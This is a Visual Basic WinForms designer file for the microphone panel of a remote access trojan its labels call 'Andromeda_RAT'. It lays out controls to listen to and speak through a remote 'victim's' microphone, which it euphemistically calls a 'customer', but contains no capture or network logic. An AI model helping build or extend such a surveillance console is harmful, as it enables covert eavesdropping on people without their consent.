<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Frm_Microphone
    Inherits System.Windows.Forms.Form
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub
    Private components As System.ComponentModel.IContainer
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Frm_Microphone))
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.OutHZ = New System.Windows.Forms.ComboBox()
        Me.OutBoxSource = New System.Windows.Forms.ComboBox()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.LAB_ERR = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.DeviceSOurVictim = New System.Windows.Forms.ComboBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.inHZ = New System.Windows.Forms.ComboBox()
        Me.InBoxSource = New System.Windows.Forms.ComboBox()
        Me.TOpacity = New System.Windows.Forms.Timer(Me.components)
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.Guna2AnimateWindow1 = New Guna.UI2.WinForms.Guna2AnimateWindow(Me.components)
        Me.Guna2BorderlessForm1 = New Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
        Me.Guna2CirclePictureBox3 = New Guna.UI2.WinForms.Guna2CirclePictureBox()
        Me.Guna2CirclePictureBox2 = New Guna.UI2.WinForms.Guna2CirclePictureBox()
        Me.Guna2CirclePictureBox1 = New Guna.UI2.WinForms.Guna2CirclePictureBox()
        Me.Painel_Teclado1 = New Guna.UI2.WinForms.Guna2Panel()
        Me.Guna2DragControl1 = New Guna.UI2.WinForms.Guna2DragControl(Me.components)
        Me.Guna2Panel1 = New Guna.UI2.WinForms.Guna2Panel()
        Me.Guna2HtmlLabel71 = New Guna.UI2.WinForms.Guna2HtmlLabel()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.b_sta = New Guna.UI2.WinForms.Guna2Button()
        Me.Guna2PictureBox1 = New Guna.UI2.WinForms.Guna2PictureBox()
        Me.Guna2Panel2 = New Guna.UI2.WinForms.Guna2Panel()
        Me.Guna2HtmlLabel1 = New Guna.UI2.WinForms.Guna2HtmlLabel()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.Guna2PictureBox2 = New Guna.UI2.WinForms.Guna2PictureBox()
        Me.bIN = New Guna.UI2.WinForms.Guna2Button()
        Me.Panel2.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        CType(Me.Guna2CirclePictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.Guna2CirclePictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.Guna2CirclePictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Painel_Teclado1.SuspendLayout()
        Me.Guna2Panel1.SuspendLayout()
        CType(Me.Guna2PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Guna2Panel2.SuspendLayout()
        CType(Me.Guna2PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.White
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.ForeColor = System.Drawing.Color.Black
        Me.Panel1.Location = New System.Drawing.Point(3, 3)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(10, 0)
        Me.Panel1.TabIndex = 23
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(12, 115)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(194, 19)
        Me.Label1.TabIndex = 16
        Me.Label1.Text = "Choose Microphone to listen"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label2.Location = New System.Drawing.Point(102, 156)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(104, 19)
        Me.Label2.TabIndex = 18
        Me.Label2.Text = "Audio Quality"
        '
        'OutHZ
        '
        Me.OutHZ.BackColor = System.Drawing.Color.Black
        Me.OutHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.OutHZ.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.OutHZ.FormattingEnabled = True
        Me.OutHZ.Items.AddRange(New Object() {"8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)"})
        Me.OutHZ.Location = New System.Drawing.Point(212, 156)
        Me.OutHZ.Name = "OutHZ"
        Me.OutHZ.Size = New System.Drawing.Size(177, 21)
        Me.OutHZ.TabIndex = 17
        '
        'OutBoxSource
        '
        Me.OutBoxSource.BackColor = System.Drawing.Color.White
        Me.OutBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.OutBoxSource.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.OutBoxSource.FormattingEnabled = True
        Me.OutBoxSource.Items.AddRange(New Object() {"CAMCORDER", "COMMUNICATION", "DEFAULT", "MIC", "RECOGNITION"})
        Me.OutBoxSource.Location = New System.Drawing.Point(212, 115)
        Me.OutBoxSource.Name = "OutBoxSource"
        Me.OutBoxSource.Size = New System.Drawing.Size(177, 21)
        Me.OutBoxSource.TabIndex = 15
        '
        'Panel2
        '
        Me.Panel2.BackColor = System.Drawing.Color.White
        Me.Panel2.Controls.Add(Me.LAB_ERR)
        Me.Panel2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer))
        Me.Panel2.Location = New System.Drawing.Point(286, 47)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(160, 97)
        Me.Panel2.TabIndex = 24
        '
        'LAB_ERR
        '
        Me.LAB_ERR.AutoSize = True
        Me.LAB_ERR.Location = New System.Drawing.Point(398, 43)
        Me.LAB_ERR.Name = "LAB_ERR"
        Me.LAB_ERR.Size = New System.Drawing.Size(21, 19)
        Me.LAB_ERR.TabIndex = 25
        Me.LAB_ERR.Text = "..."
        Me.LAB_ERR.Visible = False
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label5.Location = New System.Drawing.Point(23, 115)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(136, 19)
        Me.Label5.TabIndex = 27
        Me.Label5.Text = "Choose microphone"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label4.Location = New System.Drawing.Point(58, 151)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(101, 19)
        Me.Label4.TabIndex = 26
        Me.Label4.Text = "Victim's voice"
        '
        'DeviceSOurVictim
        '
        Me.DeviceSOurVictim.BackColor = System.Drawing.Color.Black
        Me.DeviceSOurVictim.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.DeviceSOurVictim.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.DeviceSOurVictim.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.DeviceSOurVictim.FormattingEnabled = True
        Me.DeviceSOurVictim.Items.AddRange(New Object() {"CALL", "MUSIC"})
        Me.DeviceSOurVictim.Location = New System.Drawing.Point(165, 146)
        Me.DeviceSOurVictim.Name = "DeviceSOurVictim"
        Me.DeviceSOurVictim.Size = New System.Drawing.Size(211, 24)
        Me.DeviceSOurVictim.TabIndex = 23
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label3.Location = New System.Drawing.Point(98, 191)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(61, 19)
        Me.Label3.TabIndex = 18
        Me.Label3.Text = "Quality"
        '
        'inHZ
        '
        Me.inHZ.BackColor = System.Drawing.Color.Black
        Me.inHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.inHZ.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.inHZ.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.inHZ.FormattingEnabled = True
        Me.inHZ.Items.AddRange(New Object() {"8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)"})
        Me.inHZ.Location = New System.Drawing.Point(165, 186)
        Me.inHZ.Name = "inHZ"
        Me.inHZ.Size = New System.Drawing.Size(211, 24)
        Me.inHZ.TabIndex = 17
        '
        'InBoxSource
        '
        Me.InBoxSource.BackColor = System.Drawing.Color.White
        Me.InBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.InBoxSource.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.InBoxSource.ForeColor = System.Drawing.Color.Black
        Me.InBoxSource.FormattingEnabled = True
        Me.InBoxSource.Location = New System.Drawing.Point(165, 110)
        Me.InBoxSource.Name = "InBoxSource"
        Me.InBoxSource.Size = New System.Drawing.Size(211, 24)
        Me.InBoxSource.TabIndex = 15
        '
        'TOpacity
        '
        Me.TOpacity.Interval = 1
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.TabControl1.ImageList = Me.ImageList1
        Me.TabControl1.ItemSize = New System.Drawing.Size(223, 32)
        Me.TabControl1.Location = New System.Drawing.Point(383, 498)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(24, 13)
        Me.TabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.TabControl1.TabIndex = 19
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.White
        Me.TabPage1.Controls.Add(Me.Panel1)
        Me.TabPage1.ForeColor = System.Drawing.Color.Black
        Me.TabPage1.ImageKey = "(nenhum/a)"
        Me.TabPage1.Location = New System.Drawing.Point(4, 36)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(16, 0)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Escutar"
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.Panel2)
        Me.TabPage2.ImageKey = "(nenhum/a)"
        Me.TabPage2.Location = New System.Drawing.Point(4, 36)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(16, 0)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Falar"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "headphones-removebg-preview.png")
        Me.ImageList1.Images.SetKeyName(1, "microphone.png")
        '
        'Guna2AnimateWindow1
        '
        Me.Guna2AnimateWindow1.TargetForm = Me
        '
        'Guna2BorderlessForm1
        '
        Me.Guna2BorderlessForm1.BorderRadius = 2
        Me.Guna2BorderlessForm1.ContainerControl = Me
        Me.Guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6R
        Me.Guna2BorderlessForm1.TransparentWhileDrag = True
        '
        'Guna2CirclePictureBox3
        '
        Me.Guna2CirclePictureBox3.FillColor = System.Drawing.Color.FromArgb(CType(CType(59, Byte), Integer), CType(CType(213, Byte), Integer), CType(CType(89, Byte), Integer))
        Me.Guna2CirclePictureBox3.ImageRotate = 0!
        Me.Guna2CirclePictureBox3.Location = New System.Drawing.Point(753, 12)
        Me.Guna2CirclePictureBox3.Name = "Guna2CirclePictureBox3"
        Me.Guna2CirclePictureBox3.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle
        Me.Guna2CirclePictureBox3.Size = New System.Drawing.Size(15, 15)
        Me.Guna2CirclePictureBox3.TabIndex = 161
        Me.Guna2CirclePictureBox3.TabStop = False
        '
        'Guna2CirclePictureBox2
        '
        Me.Guna2CirclePictureBox2.FillColor = System.Drawing.Color.FromArgb(CType(CType(254, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(43, Byte), Integer))
        Me.Guna2CirclePictureBox2.ImageRotate = 0!
        Me.Guna2CirclePictureBox2.Location = New System.Drawing.Point(779, 12)
        Me.Guna2CirclePictureBox2.Name = "Guna2CirclePictureBox2"
        Me.Guna2CirclePictureBox2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle
        Me.Guna2CirclePictureBox2.Size = New System.Drawing.Size(15, 15)
        Me.Guna2CirclePictureBox2.TabIndex = 160
        Me.Guna2CirclePictureBox2.TabStop = False
        '
        'Guna2CirclePictureBox1
        '
        Me.Guna2CirclePictureBox1.FillColor = System.Drawing.Color.FromArgb(CType(CType(254, Byte), Integer), CType(CType(122, Byte), Integer), CType(CType(109, Byte), Integer))
        Me.Guna2CirclePictureBox1.ImageRotate = 0!
        Me.Guna2CirclePictureBox1.Location = New System.Drawing.Point(805, 12)
        Me.Guna2CirclePictureBox1.Name = "Guna2CirclePictureBox1"
        Me.Guna2CirclePictureBox1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle
        Me.Guna2CirclePictureBox1.Size = New System.Drawing.Size(15, 15)
        Me.Guna2CirclePictureBox1.TabIndex = 159
        Me.Guna2CirclePictureBox1.TabStop = False
        '
        'Painel_Teclado1
        '
        Me.Painel_Teclado1.BackColor = System.Drawing.Color.FromArgb(CType(CType(7, Byte), Integer), CType(CType(11, Byte), Integer), CType(CType(41, Byte), Integer))
        Me.Painel_Teclado1.Controls.Add(Me.Guna2CirclePictureBox1)
        Me.Painel_Teclado1.Controls.Add(Me.Guna2CirclePictureBox2)
        Me.Painel_Teclado1.Controls.Add(Me.Guna2CirclePictureBox3)
        Me.Painel_Teclado1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Painel_Teclado1.Location = New System.Drawing.Point(0, 0)
        Me.Painel_Teclado1.MaximumSize = New System.Drawing.Size(827, 39)
        Me.Painel_Teclado1.MinimumSize = New System.Drawing.Size(827, 39)
        Me.Painel_Teclado1.Name = "Painel_Teclado1"
        Me.Painel_Teclado1.Size = New System.Drawing.Size(827, 39)
        Me.Painel_Teclado1.TabIndex = 167
        '
        'Guna2DragControl1
        '
        Me.Guna2DragControl1.DockIndicatorTransparencyValue = 0.6R
        Me.Guna2DragControl1.TargetControl = Me.Painel_Teclado1
        Me.Guna2DragControl1.UseTransparentDrag = True
        '
        'Guna2Panel1
        '
        Me.Guna2Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(7, Byte), Integer), CType(CType(11, Byte), Integer), CType(CType(41, Byte), Integer))
        Me.Guna2Panel1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Guna2Panel1.BorderRadius = 3
        Me.Guna2Panel1.Controls.Add(Me.Guna2HtmlLabel71)
        Me.Guna2Panel1.Controls.Add(Me.Label19)
        Me.Guna2Panel1.Controls.Add(Me.Label6)
        Me.Guna2Panel1.Controls.Add(Me.b_sta)
        Me.Guna2Panel1.Controls.Add(Me.Guna2PictureBox1)
        Me.Guna2Panel1.Controls.Add(Me.Label1)
        Me.Guna2Panel1.Controls.Add(Me.OutHZ)
        Me.Guna2Panel1.Controls.Add(Me.OutBoxSource)
        Me.Guna2Panel1.Controls.Add(Me.Label2)
        Me.Guna2Panel1.Location = New System.Drawing.Point(9, 48)
        Me.Guna2Panel1.MaximumSize = New System.Drawing.Size(403, 308)
        Me.Guna2Panel1.MinimumSize = New System.Drawing.Size(403, 308)
        Me.Guna2Panel1.Name = "Guna2Panel1"
        Me.Guna2Panel1.Size = New System.Drawing.Size(403, 308)
        Me.Guna2Panel1.TabIndex = 168
        '
        'Guna2HtmlLabel71
        '
        Me.Guna2HtmlLabel71.BackColor = System.Drawing.Color.Transparent
        Me.Guna2HtmlLabel71.Font = New System.Drawing.Font("Segoe UI Semibold", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Guna2HtmlLabel71.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Guna2HtmlLabel71.Location = New System.Drawing.Point(16, 266)
        Me.Guna2HtmlLabel71.Name = "Guna2HtmlLabel71"
        Me.Guna2HtmlLabel71.Size = New System.Drawing.Size(127, 23)
        Me.Guna2HtmlLabel71.TabIndex = 163
        Me.Guna2HtmlLabel71.Text = "Andromeda_RAT"
        '
        'Label19
        '
        Me.Label19.Anchor = CType((System.Windows.Forms.AnchorStyles.Left Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label19.AutoSize = True
        Me.Label19.BackColor = System.Drawing.Color.Transparent
        Me.Label19.CausesValidation = False
        Me.Label19.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label19.ForeColor = System.Drawing.Color.FromArgb(CType(CType(111, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(115, Byte), Integer))
        Me.Label19.Location = New System.Drawing.Point(26, 55)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(204, 17)
        Me.Label19.TabIndex = 161
        Me.Label19.Text = "Listen to selected customer audio"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label6.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label6.Location = New System.Drawing.Point(12, 15)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(131, 19)
        Me.Label6.TabIndex = 160
        Me.Label6.Text = "Listen Microphone"
        '
        'b_sta
        '
        Me.b_sta.BorderColor = System.Drawing.Color.Empty
        Me.b_sta.BorderRadius = 3
        Me.b_sta.BorderThickness = 1
        Me.b_sta.DisabledState.BorderColor = System.Drawing.Color.DarkGray
        Me.b_sta.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray
        Me.b_sta.DisabledState.FillColor = System.Drawing.Color.FromArgb(CType(CType(169, Byte), Integer), CType(CType(169, Byte), Integer), CType(CType(169, Byte), Integer))
        Me.b_sta.DisabledState.ForeColor = System.Drawing.Color.FromArgb(CType(CType(141, Byte), Integer), CType(CType(141, Byte), Integer), CType(CType(141, Byte), Integer))
        Me.b_sta.FillColor = System.Drawing.Color.Transparent
        Me.b_sta.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.b_sta.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.b_sta.Image = CType(resources.GetObject("b_sta.Image"), System.Drawing.Image)
        Me.b_sta.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.b_sta.Location = New System.Drawing.Point(263, 246)
        Me.b_sta.Name = "b_sta"
        Me.b_sta.Size = New System.Drawing.Size(126, 43)
        Me.b_sta.TabIndex = 158
        Me.b_sta.Text = "Listen"
        Me.b_sta.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        '
        'Guna2PictureBox1
        '
        Me.Guna2PictureBox1.BackColor = System.Drawing.Color.Transparent
        Me.Guna2PictureBox1.Image = CType(resources.GetObject("Guna2PictureBox1.Image"), System.Drawing.Image)
        Me.Guna2PictureBox1.ImageRotate = 0!
        Me.Guna2PictureBox1.Location = New System.Drawing.Point(359, 15)
        Me.Guna2PictureBox1.Name = "Guna2PictureBox1"
        Me.Guna2PictureBox1.Size = New System.Drawing.Size(30, 30)
        Me.Guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.Guna2PictureBox1.TabIndex = 162
        Me.Guna2PictureBox1.TabStop = False
        Me.Guna2PictureBox1.UseTransparentBackground = True
        '
        'Guna2Panel2
        '
        Me.Guna2Panel2.BackColor = System.Drawing.Color.FromArgb(CType(CType(7, Byte), Integer), CType(CType(11, Byte), Integer), CType(CType(41, Byte), Integer))
        Me.Guna2Panel2.Controls.Add(Me.Guna2HtmlLabel1)
        Me.Guna2Panel2.Controls.Add(Me.Label8)
        Me.Guna2Panel2.Controls.Add(Me.Label7)
        Me.Guna2Panel2.Controls.Add(Me.Guna2PictureBox2)
        Me.Guna2Panel2.Controls.Add(Me.bIN)
        Me.Guna2Panel2.Controls.Add(Me.TabControl1)
        Me.Guna2Panel2.Controls.Add(Me.Label5)
        Me.Guna2Panel2.Controls.Add(Me.InBoxSource)
        Me.Guna2Panel2.Controls.Add(Me.Label4)
        Me.Guna2Panel2.Controls.Add(Me.inHZ)
        Me.Guna2Panel2.Controls.Add(Me.DeviceSOurVictim)
        Me.Guna2Panel2.Controls.Add(Me.Label3)
        Me.Guna2Panel2.Location = New System.Drawing.Point(418, 48)
        Me.Guna2Panel2.MaximumSize = New System.Drawing.Size(397, 308)
        Me.Guna2Panel2.MinimumSize = New System.Drawing.Size(397, 308)
        Me.Guna2Panel2.Name = "Guna2Panel2"
        Me.Guna2Panel2.Size = New System.Drawing.Size(397, 308)
        Me.Guna2Panel2.TabIndex = 169
        '
        'Guna2HtmlLabel1
        '
        Me.Guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent
        Me.Guna2HtmlLabel1.Font = New System.Drawing.Font("Segoe UI Semibold", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Guna2HtmlLabel1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Guna2HtmlLabel1.Location = New System.Drawing.Point(27, 266)
        Me.Guna2HtmlLabel1.Name = "Guna2HtmlLabel1"
        Me.Guna2HtmlLabel1.Size = New System.Drawing.Size(127, 23)
        Me.Guna2HtmlLabel1.TabIndex = 164
        Me.Guna2HtmlLabel1.Text = "Andromeda_RAT"
        '
        'Label8
        '
        Me.Label8.Anchor = CType((System.Windows.Forms.AnchorStyles.Left Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label8.AutoSize = True
        Me.Label8.BackColor = System.Drawing.Color.Transparent
        Me.Label8.CausesValidation = False
        Me.Label8.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label8.ForeColor = System.Drawing.Color.FromArgb(CType(CType(111, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(115, Byte), Integer))
        Me.Label8.Location = New System.Drawing.Point(33, 34)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(195, 17)
        Me.Label8.TabIndex = 162
        Me.Label8.Text = "Chat directly with your customer"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label7.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.Label7.Location = New System.Drawing.Point(16, 15)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(152, 19)
        Me.Label7.TabIndex = 162
        Me.Label7.Text = "Talk to your customer"
        '
        'Guna2PictureBox2
        '
        Me.Guna2PictureBox2.BackColor = System.Drawing.Color.Transparent
        Me.Guna2PictureBox2.Image = CType(resources.GetObject("Guna2PictureBox2.Image"), System.Drawing.Image)
        Me.Guna2PictureBox2.ImageRotate = 0!
        Me.Guna2PictureBox2.Location = New System.Drawing.Point(356, 15)
        Me.Guna2PictureBox2.Name = "Guna2PictureBox2"
        Me.Guna2PictureBox2.Size = New System.Drawing.Size(30, 30)
        Me.Guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.Guna2PictureBox2.TabIndex = 159
        Me.Guna2PictureBox2.TabStop = False
        Me.Guna2PictureBox2.UseTransparentBackground = True
        '
        'bIN
        '
        Me.bIN.BorderColor = System.Drawing.Color.Empty
        Me.bIN.BorderRadius = 3
        Me.bIN.BorderThickness = 1
        Me.bIN.DisabledState.BorderColor = System.Drawing.Color.DarkGray
        Me.bIN.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray
        Me.bIN.DisabledState.FillColor = System.Drawing.Color.FromArgb(CType(CType(169, Byte), Integer), CType(CType(169, Byte), Integer), CType(CType(169, Byte), Integer))
        Me.bIN.DisabledState.ForeColor = System.Drawing.Color.FromArgb(CType(CType(141, Byte), Integer), CType(CType(141, Byte), Integer), CType(CType(141, Byte), Integer))
        Me.bIN.FillColor = System.Drawing.Color.Transparent
        Me.bIN.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.bIN.ForeColor = System.Drawing.Color.FromArgb(CType(CType(103, Byte), Integer), CType(CType(156, Byte), Integer), CType(CType(176, Byte), Integer))
        Me.bIN.Image = CType(resources.GetObject("bIN.Image"), System.Drawing.Image)
        Me.bIN.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.bIN.Location = New System.Drawing.Point(259, 246)
        Me.bIN.Name = "bIN"
        Me.bIN.Size = New System.Drawing.Size(126, 43)
        Me.bIN.TabIndex = 159
        Me.bIN.Text = "Speak"
        Me.bIN.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        '
        'Microphone
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(31, Byte), Integer), CType(CType(19, Byte), Integer), CType(CType(84, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(827, 375)
        Me.Controls.Add(Me.Guna2Panel2)
        Me.Controls.Add(Me.Guna2Panel1)
        Me.Controls.Add(Me.Painel_Teclado1)
        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer))
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MaximumSize = New System.Drawing.Size(827, 375)
        Me.MinimumSize = New System.Drawing.Size(827, 375)
        Me.Name = "Microphone"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Microphone"
        Me.Panel2.ResumeLayout(False)
        Me.Panel2.PerformLayout()
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
